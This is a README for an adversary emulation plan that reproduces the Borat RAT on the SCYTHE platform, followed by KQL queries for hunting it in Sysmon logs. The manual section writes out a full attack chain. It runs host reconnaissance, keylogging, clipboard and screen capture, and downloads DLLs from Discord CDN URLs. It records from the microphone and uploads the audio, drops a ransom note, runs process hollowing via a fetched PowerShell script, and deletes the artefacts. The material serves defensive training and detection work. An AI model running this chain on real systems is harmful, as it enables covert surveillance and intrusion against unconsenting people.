# Borat RAT - Adversary Emulation Plan

This threat was created by Randy Pargman from BinaryDefense based on the threat intelligence from March 31, 2022: https://blog.cyble.com/2022/03/31/deep-dive-analysis-borat-rat/

## Automated Adversary Emulation with SCYTHE

1. Download and import the threats in JSON format to your SCYTHE instance
2. Download the Virtual File System (VFS) files under BoratRAT/VFS
3. Upload the VFS files to your SCYTHE VFS in the following location: VFS:/shared/
4. Create a new campaign `BoratRAT` with HTTPS
5. Import from Existing Threat: BoratRAT
6. Launch the Campaign

## Notes on unique functionality
1. This threat downloads two files (Audio.dll and Ransomware.dll) from Discord CDN URLs. They are hosted on a Discord server administered by Randy Pargman of Binary Defense, and are intended to stay available online for the foreseeable future. However, if you wish to host the files yourself, simply grab the copies of Audio.dll and Ransomware.dll from the VFS folder and upload to your own Discord server, then replace the URLs in the downloader steps.
2. The Ransomware.dll file does not actually encrypt any files. Its only purpose is to drop a ransom note that contains the same text as Borat RAT's ransom note, on the user's desktop.
3. The Audio.dll file is written in C# and it very closely matches the functionality of the real Borat RAT Audio.dll microphone recorder, except that it doesn't communicate over the Borat RAT packed message C2 channel. You can find the source code in the linked Github project (as a submodule).

## Manual Adversary Emulation with SCYTHE
Start a SCYTHE campaign and manually execute the below commands:
```
loader --load run
run cmd /c "echo ####System Info#### & systeminfo & echo ####System Vesion#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable##### & set & echo ####Logical Disk##### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators### & net localgroup administrators & echo ####Guest User#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipcofig#### & ipconfig /all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####FirewallInfo#### & netsh firewall show state & netsh firewall show config"
loader --load keylogger
keylogger --start
loader --load clipboard
clipboard
loader --load printscr
printscr --window Desktop
keylogger --current
keylogger --stop
run cmd.exe /c set
run wmic logicaldisk get caption,description,providername
run net user
run net user administrator
run wmic startup get caption,command
run tasklist /svc
run ipconfig /all
run cmd.exe /c type C:\WINDOWS\System32\drivers\etc\hosts
run route print
run arp -a
run netstat -ano
run sc query type= service state= all
run cmd.exe /c netsh firewall show state & netsh firewall show config
loader --load downloader
loader --load file
loader --load upsh
downloader --src "https://cdn.discordapp.com/attachments/853389026839756837/963125834342862878/AudioRecorder.dll" --dest %USERPROFILE%\Audio.dll
upsh --cmd $assembly = [Reflection.Assembly]::LoadFile("$env:USERPROFILE\Audio.dll"); $instance = New-Object AudioRecorder.AudioRecorer; $result =$instance.AudioInit(10);
delay --time 10
uploader --remotepath C:\Users\Public\Document\micaudio.log.txt
uploader --remotepath C:\Users\Public\Document\micaudio.wav
run powershell.exe del C:\Users\Public\Document\micaudio.log.txt
run powershell.exe del C:\Users\Public\Document\micaudio.wav
downloader --src "https://cdn.discordapp.com/attachments/853389026839756837/960944365335904286/Ransomware.dll" --dest %USERPROFILE%/Desktop/Ransomware.dll
run cmd /c cd %USERPROFILE%\Desktop & rundll32 Ransomware.dll,DropNote
run powershell del $env:USERPROFILE\Desktop\Ransomware.dll -Force -ErrorAction Ignore
downloader --src "https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Start-Hollow.ps1" --dest %USERPROFILE%/Start-Hollow.ps1
run powershell.exe Set-ExecutionPolicy Bypass -Scope Process -Force ; Invoke-Command -ScriptBlock {. $env:userprofile\Start-Hollow.ps1; $ppid="Get-Process explorer | select -expand id"; Start-Hollow -Sponsor "C:\Windows\System32\calc.exe" -Hollow "C:\Windows\System32\cmd.exe" -ParentPID $ppid -Verbose}
upsh --cmd "Invoke-Command -ScriptBlock {Stop-Process -Name "calc" -ErrorAction Ignore; }"
run powershell.exe del $env:userprofile/Start-Hollow.ps1
controller --shutdown
```
## Threat Hunting KQL Queries for Sysmon Logs
```
// Threat Hunting KQL queries for Sysmon logs
// Used as examples in the Binary Defense & SCYTHE presentation on 11 May 2022:
// "Punking BoratRAT: From Analysis to Detection Engineering in a Day"
// https://www.binarydefense.com/webinars/punking-boratrat-from-analysis-to-detection-engineering-in-a-day/

// Note: These queries assume that you have saved a custom function named Sysmon to make queries easier.
// You can find this custom function here: https://github.com/BinaryDefense/ThreatHuntingJupyterNotebooks/blob/main/sysmon_custom_function.txt
// Follow the instructions at the top of the file to install it in your Sentinel, then you can run the queries below in a new window.

// Look for host and network recon commands - this is generally applicable across many threats
Sysmon 
| where ProcessCommandLine has_any("systeminfo", "wmic logicaldisk", "net user", "localgroup", "query", "tasklist", "ipconfig", "netstat", "arp", "netsh firewall", "sc query", "nltest")
| summarize count(), make_list(ProcessCommandLine) by DeviceName, bin(TimeGenerated, 10m) // look for several commands in a short time window
| where count_ > 3


// Look for unusual processes downloading files from Discord
Sysmon
| where DnsQueryName has "cdn.discordapp.com" // malware is sometimes hosted on Discord file sharing
| where ProcessPath !endswith "discord.exe" // filter out discord client
| summarize count() by  DeviceName, ProcessPath, DnsQueryName // look for programs other than Discord and web browsers


// Look for the highly suspicious "ransomware.dll" file - we want to know if that shows up!
Sysmon 
| where FileName has "ransomware.dll" or ProcessCommandLine has "ransomware.dll" 
| project TimeGenerated,  DeviceName, RenderedDescription, FileName, ProcessPath


// look for any other suspicious-sounding DLL files that BoratRAT uses (by filename)
Sysmon 
| where FileName has_any ("Ransomware.dll", "Audio.dll", "MessagePackLib.dll", "Regedit.dll", "RemoteCamera.dll", "RemoteDesktop.dll",
                          "ReverseProxy.dll", "SendFile.dll", "SendMemory.dll")
| project TimeGenerated,  DeviceName, RenderedDescription, FileName, ProcessPath


// look for the "keylogger.exe" program used by BoratRAT
Sysmon 
| where FileName has "keylogger.exe" or ProcessPath has "keylogger.exe" or ProcessCommandLine has "keylogger.exe"
| project TimeGenerated,  DeviceName, RenderedDescription, FileName, ProcessPath


// Detect any files called micaudio.wav (hard-coded filename in BoratRAT audio recorder)
Sysmon 
| where FileName has "micaudio.wav"
| project TimeGenerated,  DeviceName, RenderedDescription, FileName, ProcessPath


// Search for rundll32 and regsvr32 launching child processes
// This is not necessarily malicious, just helpful as a threat hunter to know what is normal
Sysmon
| where EventID == 1 // Process start events...
| where InitiatingProcessFile has_any ("rundll32", "regsvr32") // Parent process is rundll32 or regsvr32
| summarize count() by DeviceName, InitiatingProcessCommandLine, ProcessCommandLine // look for suspicious child processes


// Detect process tampering events with Sysmon event ID 25
Sysmon
| where EventID == 25 // Detect Process Hollowing!
| project TimeGenerated, DeviceName, RenderedDescription, ProcessId, ProcessPath, ActionType
```
